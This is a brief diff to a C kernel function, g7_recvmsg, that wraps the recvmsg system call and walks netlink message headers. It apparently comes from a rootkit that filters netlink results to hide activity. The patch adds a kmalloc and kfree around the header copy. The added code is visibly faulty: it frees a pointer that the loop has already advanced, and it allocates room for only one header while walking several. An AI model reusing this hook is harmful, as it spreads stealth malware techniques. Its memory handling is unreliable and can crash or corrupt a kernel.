@@ -171,6 +171,8 @@ g7_recvmsg(struct pt_regs *pt_regs)
     if ((len = ret = sys_recvmsg(pt_regs)) < 0)
         return ret;
 
+    nh = kmalloc(sizeof(struct nlmsghdr), GFP_KERNEL);
+
     copy_from_user(nh,
         (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base,
         sizeof(struct nlmsghdr));
@@ -191,6 +193,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
             nh = NLMSG_NEXT(nh, len);
     }
 
+    kfree(nh);
     return ret;
 }
 
